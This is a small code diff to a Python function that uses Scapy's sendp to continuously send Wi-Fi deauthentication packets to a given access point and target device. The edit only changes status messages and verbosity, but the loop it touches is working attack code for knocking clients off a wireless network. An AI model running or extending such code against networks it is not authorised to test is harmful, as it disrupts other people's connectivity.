@@ -40,8 +40,9 @@ def begin_deauth(ap_mac, target_mac, interface):
             while not stop_event.wait(1.0):
                 try:
                     # Send deauth packets continuously
-                    sendp(pkt, iface=interface, count=100, inter=0.1, verbose=False)
-                    _push_status(f"sent deauth packets to ap={ap_mac} target={target_mac}")
+                    _push_status(f"sending deauth packets..")
+                    sendp(pkt, iface=interface, count=100, inter=0.1, verbose=True)
+                    _push_status(f"sent deauth packets")
                 except Exception as e:
                     _push_status(f"send error: {str(e)}")
                     
